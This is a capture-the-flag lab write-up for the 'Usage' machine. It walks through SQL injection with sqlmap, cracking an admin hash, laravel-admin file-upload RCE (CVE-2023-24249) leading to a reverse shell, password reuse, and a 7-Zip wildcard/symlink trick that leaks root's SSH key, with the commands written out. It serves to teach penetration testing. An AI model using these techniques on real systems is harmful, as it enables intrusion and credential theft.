# Usage — Easy — Linux

**Date:** 8 July 2026

---

## Tags

`#linux` `#web` `#sqli` `#sqlmap` `#laravel-admin` `#cve-2023-24249` `#file-upload` `#password-reuse` `#7zip-wildcard` `#symlink` `#privesc`

---

## What I Know

|Item|Detail|
|---|---|
|Target|usage.htb / admin.usage.htb (10.129.29.1)|
|OS|Linux (Ubuntu)|
|Open ports|22 (SSH), 80 (HTTP)|
|Services|OpenSSH 8.9p1; nginx 1.18.0|
|Web app|Laravel blog + laravel-admin panel (admin.usage.htb)|
|Foothold|SQLi on forgot-password → crack admin hash → laravel-admin RCE (CVE-2023-24249)|
|Users|(web) → dash → xander → root|
|Privesc|plaintext creds reuse → xander; sudo custom binary → 7zip wildcard/symlink → root SSH key|

---

## Recon Notes

### Nmap Results

```
nmap --min-rate 3000 -T4 -p- 10.129.29.1

Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-08 15:20 +0100
Nmap scan report for 10.129.29.1
Host is up (0.13s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 31.73 seconds
```

<img width="889" height="327" alt="image" src="https://github.com/user-attachments/assets/e7ef4074-86d9-4990-b7ce-54a3c307937b" />

```
nmap -sC -sV -p22,80 10.129.29.1

Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-08 15:21 +0100
Nmap scan report for 10.129.29.1
Host is up (0.014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.87 seconds
```

<img width="1321" height="487" alt="image" src="https://github.com/user-attachments/assets/fc59ea96-bc3a-402f-9da1-e1e42b785345" />

**What each port tells me:**

- **Port 22 (SSH)** — OpenSSH 8.9p1 on Ubuntu. Open, but no credentials yet, a target to return to once I find some.
- **Port 80 (HTTP)** — nginx 1.18.0, redirecting to `usage.htb`. My entry point; the vhost redirect means I need to add `usage.htb` to `/etc/hosts` first.

---

## Enumeration Log

```
OBSERVATION: Port 22 is open
WHAT IT TELLS ME: We can SSH into the server
WHAT I AM GOING TO TRY: Keep it aside
WHY: I don't have credentials
RESULT: N/A
WHAT NEXT:
- Port 80 redirects to usage.htb, add it to /etc/hosts and investigate
- Directory-fuzz for hidden paths
- vhost-fuzz for additional subdomains
- Identify the tech stack
- Inspect source, JS, and Burp requests for anything interesting
```

```
OBSERVATION:
- The web app has four features: Login, Register, Forgot Password, and Admin (on admin.usage.htb)
- Directory fuzzing found nothing notable; the only extra vhost is admin.usage.htb (added to /etc/hosts)
- Wappalyzer shows nothing standout, but the source pulls in laravel-admin (an admin-panel builder
  for the Laravel PHP framework)
- Laravel confirmed in Burp: admin.usage.htb sets laravel_session and XSRF-TOKEN cookies
WHAT IT TELLS ME:
- I can self-register a user
- The admin portal needs credentials
- The stack is Laravel + laravel-admin
WHAT I AM GOING TO TRY:
- Register/login and try to tamper the request to register myself as admin
- Test laravel-admin default creds (admin:admin)
- Research Laravel vulns (needs a version to be precise)
- If all else fails, test the input fields for SQL injection
WHY: To find any route into the admin panel or to leak data
RESULT:
- Registration/login works but gives nothing useful, and I couldn't tamper my way to admin
- admin:admin doesn't work
- Laravel has known vulns but I lack a version number to target precisely
- The Forgot Password field errors on a single quote (') and behaves normally on two (''),
  a strong sign of SQL injection
WHAT NEXT:
- Exploit the SQLi on forgot-password to exfiltrate data (the only useful action here is data exfiltratation)
```

<img width="2169" height="629" alt="image" src="https://github.com/user-attachments/assets/73066fa8-3060-44c0-83c2-ab7b973c5b7d" />

<img width="1770" height="746" alt="image" src="https://github.com/user-attachments/assets/008de107-996f-404f-9a31-a7c992e6d8bd" />

<img width="1079" height="430" alt="image" src="https://github.com/user-attachments/assets/83ef4eb8-be18-403d-80aa-593f3770abde" />

<img width="1721" height="503" alt="image" src="https://github.com/user-attachments/assets/9d388741-f8be-4596-a971-c50e7e21db40" />

<img width="1418" height="601" alt="image" src="https://github.com/user-attachments/assets/9abf1f49-b45d-4ae6-9aa3-1efbef39c21c" />

<img width="1760" height="1289" alt="image" src="https://github.com/user-attachments/assets/01c60ea1-03c7-4e32-abe8-aeafd8b5bf3f" />

<img width="1513" height="531" alt="image" src="https://github.com/user-attachments/assets/2d1291e0-caa0-425f-bc16-7e0f49fc8fc6" />

<img width="1493" height="798" alt="image" src="https://github.com/user-attachments/assets/a84bac67-1788-41a3-8152-5c61358953bc" />

<img width="1421" height="396" alt="image" src="https://github.com/user-attachments/assets/f1404a3d-2587-4c49-a393-ef382277be15" />

<img width="1335" height="447" alt="image" src="https://github.com/user-attachments/assets/bb47838f-07c0-487e-9d43-1da13b1a6e95" />


```
OBSERVATION: A manual ' or '1'='1 payload returns only itself, suggesting little is directly reflected
WHAT IT TELLS ME: The injection is present but not cleanly reflected, so error-based/blind extraction
  via sqlmap is the way to enumerate databases, tables, and contents
WHAT I AM GOING TO TRY: Point sqlmap at the vulnerable email parameter
WHY: The email parameter in POST /forget-password is injectable
RESULT:
- sqlmap dumped databases, tables, and rows including a hashed password for the "administrator" user
- Cracked the hash with john
WHAT NEXT: Log into admin.usage.htb with the recovered administrator credentials
```

<img width="556" height="95" alt="image" src="https://github.com/user-attachments/assets/804e4712-c601-48d6-8738-06f695996812" />

<img width="1047" height="604" alt="image" src="https://github.com/user-attachments/assets/653c501c-4a98-496d-b925-1b881aa14329" />

<img width="1223" height="809" alt="image" src="https://github.com/user-attachments/assets/ee990862-2121-471f-afb0-989b6c732810" />

<img width="1423" height="414" alt="image" src="https://github.com/user-attachments/assets/5c4a08eb-76db-4b80-ba3c-24db69d8b8fa" />

<img width="1304" height="296" alt="image" src="https://github.com/user-attachments/assets/1a273034-1d45-4b01-9c48-4ca405aea374" />

<img width="940" height="640" alt="image" src="https://github.com/user-attachments/assets/32ffac9a-b6cd-445e-9f7f-bbb64c5bb0f0" />

<img width="1555" height="557" alt="image" src="https://github.com/user-attachments/assets/bb609c8d-7318-4284-9824-5cec0dc4f0bd" />

<img width="1531" height="476" alt="image" src="https://github.com/user-attachments/assets/a7ce4c37-aebc-4dab-9744-d3c645edd2ab" />

<img width="1167" height="379" alt="image" src="https://github.com/user-attachments/assets/255db430-4000-4740-a1cf-43812ef6aff7" />


```
OBSERVATION:
- Logged into admin.usage.htb with the cracked creds; the panel discloses the versions of its components
- encore/laravel-admin 1.8.18 is vulnerable to CVE-2023-24249, RCE via arbitrary file upload
WHAT IT TELLS ME: I can upload a PHP web shell (typically via the user-avatar upload) and trigger RCE
WHAT I AM GOING TO TRY: Upload a PHP reverse shell as the avatar and trigger it
WHY: CVE-2023-24249 affects laravel-admin up to 1.8.19 through this upload path
RESULT:
- The upload filter only accepts images
- A .%00.jpg trick failed , the file still opened as an image
- Working bypass: upload a valid image, intercept the request in Burp, and rename the file to .php
  before it's saved that landed the web shell and triggered a reverse shell. Read user.txt
WHAT NEXT: Enumerate the system for a path to root
```

<img width="1902" height="1076" alt="image" src="https://github.com/user-attachments/assets/dd196488-860b-441a-90b5-f52ae5dc5c2b" />

<img width="1027" height="130" alt="image" src="https://github.com/user-attachments/assets/b5cd9847-6e72-4460-813f-fca1f4df0185" />

<img width="1152" height="822" alt="image" src="https://github.com/user-attachments/assets/4f8435cf-1794-44ca-99e7-3d7405369f46" />

<img width="1635" height="806" alt="image" src="https://github.com/user-attachments/assets/443e0a90-8ea8-48e7-a26f-05ee09d49cd2" />

<img width="2301" height="351" alt="image" src="https://github.com/user-attachments/assets/3aa71331-6530-4d9f-9eb7-af9563494c97" />

<img width="1021" height="1076" alt="image" src="https://github.com/user-attachments/assets/e822a61e-b83c-4f83-a1bf-2b77b7357141" />

<img width="1002" height="1148" alt="image" src="https://github.com/user-attachments/assets/95a1699c-4455-4f03-b89c-4da7ae074c04" />

<img width="2548" height="776" alt="image" src="https://github.com/user-attachments/assets/eca55178-a4fd-4793-8a7b-f362c3e4117c" />

<img width="1338" height="512" alt="image" src="https://github.com/user-attachments/assets/dd3f5362-b241-4498-b7a3-f71fd8129ca9" />

<img width="1112" height="416" alt="image" src="https://github.com/user-attachments/assets/883bbbe4-f73d-4dbc-a487-de86c2107ba8" />

```
OBSERVATION:
- /home contains another user, xander
- Filesystem enumeration found two plaintext passwords: one in
  /var/www/html/project_admin/.env and one in /home/dash/.monitrc
  (.monitrc is the config for Monit, a lightweight Unix monitoring/management tool)
WHAT IT TELLS ME: One of these passwords may be reused for xander
WHAT I AM GOING TO TRY: Try both passwords for xander
WHY: Password reuse across config files and user accounts is common
RESULT: One of the passwords worked, logged in as xander
WHAT NEXT: Enumerate as xander
```

<img width="538" height="138" alt="image" src="https://github.com/user-attachments/assets/706d5096-bf25-43b3-ad76-cecd0460715f" />

<img width="844" height="201" alt="image" src="https://github.com/user-attachments/assets/8a1c6018-8636-4732-ac4b-f25231c74169" />

<img width="870" height="471" alt="image" src="https://github.com/user-attachments/assets/ab8db825-a736-472e-873a-8a192d15b0ff" />

<img width="948" height="357" alt="image" src="https://github.com/user-attachments/assets/c4c5d0dc-6d5d-42d3-9239-1b5bab9d363b" />

<img width="694" height="254" alt="image" src="https://github.com/user-attachments/assets/438a5b4b-1858-4bcb-bb3e-c3cc52750951" />

<img width="1029" height="325" alt="image" src="https://github.com/user-attachments/assets/7fe9062f-ff6f-41d5-ab34-63940ddd4491" />

<img width="924" height="72" alt="image" src="https://github.com/user-attachments/assets/b10522cd-0c7a-48e4-bd1c-32ce73831a0a" />

```
OBSERVATION:
- sudo -l shows xander can run /usr/bin/usage_management as root with no password
- It's not in GTFOBins, so it's a custom binary file(/usr/bin/usage_management) shows an ELF 64-bit PIE executable,
  so I ran strings on it
- Running it offers three options: 1) Project Backup  2) Backup MySQL data  3) Reset admin password
- strings reveals option 1 backs up /var/www/html with:
    /usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
WHAT IT TELLS ME:
- That unquoted trailing * is a classic WILDCARD INJECTION sink. When a privileged program runs an
  archiver (tar/zip/7z/…) with an unquoted *, attacker-created filenames in the target directory are
  interpreted as command-line switches
WHAT I AM GOING TO TRY: Research the 7za/7-Zip wildcard technique
WHY: Wildcard injection is a well-known privesc primitive
RESULT:
- The 7-Zip trick (HackTricks "wildcards spare tricks"): 7-Zip treats a filename starting with @ as a
  file-list, and -snl makes it follow symlinks. By creating, INSIDE the backed-up directory
  (/var/www/html), an @<name> file plus a symlink <name> → /root/.ssh/id_rsa, 7-Zip tries to read the
  symlink target as a list and prints its contents (the root private key) into the output/error stream
- Recovered root's /root/.ssh/id_rsa, saved it locally (had to strip the trailing ":No more files"
  line that 7z appends), and SSH'd in as root to read root.txt
```

<img width="1624" height="146" alt="image" src="https://github.com/user-attachments/assets/a507da8d-3a2f-4ed6-9de5-5a56c80c1691" />

<img width="720" height="516" alt="image" src="https://github.com/user-attachments/assets/e24b3b10-b0ac-4864-a3c9-64aeb5f6a719" />

<img width="975" height="221" alt="image" src="https://github.com/user-attachments/assets/13c4d7ec-1892-418e-8f92-3c928d71f2d0" />

<img width="767" height="141" alt="image" src="https://github.com/user-attachments/assets/258f057d-09e6-4f55-8f3a-1dea0342c2da" />

<img width="1173" height="706" alt="image" src="https://github.com/user-attachments/assets/f0b98c08-7377-4f9b-a0da-3791f6e357c4" />

<img width="1828" height="623" alt="image" src="https://github.com/user-attachments/assets/dfbf7361-7cdd-4b03-91c6-75e793220a95" />

<img width="1213" height="339" alt="image" src="https://github.com/user-attachments/assets/ecba9e5b-9204-4912-9004-edfdd8e9c730" />

<img width="547" height="98" alt="image" src="https://github.com/user-attachments/assets/2eb198ea-16a7-4705-9fa9-c6cf04a85bf6" />

<img width="1143" height="341" alt="image" src="https://github.com/user-attachments/assets/86679793-8472-4b33-b114-71a52da1a8b3" />

<img width="1048" height="211" alt="image" src="https://github.com/user-attachments/assets/6a6e85a4-0a8c-4f9a-ba0c-dd37dc324399" />

<img width="680" height="112" alt="image" src="https://github.com/user-attachments/assets/66b46995-762b-4464-be58-c0caf1fca790" />

---

## Foothold

**How I got in:** The Forgot Password form on `usage.htb` was vulnerable to SQL injection (a single quote broke the query). Using sqlmap against the `email` parameter of `POST /forget-password`, I dumped the database and recovered the **administrator** password hash, then cracked it with john. Those credentials logged into the admin panel on `admin.usage.htb`, which ran **laravel-admin 1.8.18** which is vulnerable to **CVE-2023-24249**, an arbitrary-file-upload RCE. The avatar upload only accepted images, so I uploaded a valid image, intercepted the request in Burp, and renamed the file to `.php` before it was written landing a PHP web shell and a reverse shell for the user flag.

**Command / exploit used:**

```
echo "10.129.29.1  usage.htb admin.usage.htb" | sudo tee -a /etc/hosts

# SQLi → dump + crack
sqlmap -r forget.req -p email --batch --dump      # forget.req = saved POST /forget-password
john --wordlist=rockyou.txt admin.hash

# CVE-2023-24249: upload image via avatar, intercept in Burp, rename to shell.php
# then browse to the uploaded path to trigger:
nc -lnvp <LPORT>          # → shell as the web user
```

**Why it worked:** Two chained web flaws. The forgot-password query concatenated user input without parameterisation (SQLi), exposing the admin hash. Then an outdated laravel-admin (1.8.18) checked only the _declared_ image type on upload, not the final stored filename/extension, so renaming to `.php` in-flight bypassed the filter and let PHP execute the uploaded file.

---

## Privilege Escalation

**Path taken (web → xander → root):**

1. **Lateral move via reused plaintext creds.** Enumeration turned up two cleartext passwords in config files `/var/www/html/project_admin/.env` and `/home/dash/.monitrc`. One of them was reused as **xander**'s password, giving an SSH/interactive session as xander.
2. **Root via 7-Zip wildcard/symlink in a sudo binary.** `sudo -l` let xander run the custom `/usr/bin/usage_management` as root. `strings` showed its backup option runs `7za a /var/backups/project.zip -tzip -snl -mmt -- *` from within `/var/www/html`. 7-Zip treats a filename beginning with `@` as a file-list, and `-snl` makes it follow symlinks so I created, inside `/var/www/html`, a file named `@id_rsa` alongside a symlink `id_rsa → /root/.ssh/id_rsa`. When the root-run backup expanded `*`, 7-Zip tried to read the symlink target as a list and printed **root's private SSH key** into its error output. I saved that key locally (stripping the trailing `:No more files` line 7z appends) and SSH'd in as root.

```
# as xander, inside the directory that gets archived:
cd /var/www/html
ln -s /root/.ssh/id_rsa id_rsa
touch @id_rsa
sudo /usr/bin/usage_management      # choose "Project Backup" → root's id_rsa leaks in the output
# copy the key locally, remove the ":No more files" line, then:
chmod 600 id_rsa && ssh -i id_rsa root@usage.htb
```

**Why it worked:** Two failures. First, credentials were stored in plaintext in config files and reused for a user account. Second, the real root cause, a root-run program invoked `7za` with an **unquoted `*`** over an attacker-writable directory. Wildcard expansion turns attacker-controlled filenames into arguments, and 7-Zip's `@list` + symlink-follow behaviour weaponises that into an arbitrary root file read, which leaked root's SSH key. Quoting arguments / not globbing attacker-writable paths, and not following symlinks during backups, would each have broken it.

---

## Post-Box Debrief

1. **Foothold technique in one sentence:** SQL-injected the forgot-password form to dump and crack the admin hash, logged into laravel-admin 1.8.18, and abused CVE-2023-24249 (upload an image, rename to `.php` in Burp) for a web shell.
2. **Privesc technique in one sentence:** Reused a plaintext config-file password to become xander, then exploited a 7-Zip wildcard/symlink flaw in a root-run sudo binary to leak root's SSH key and log in as root.
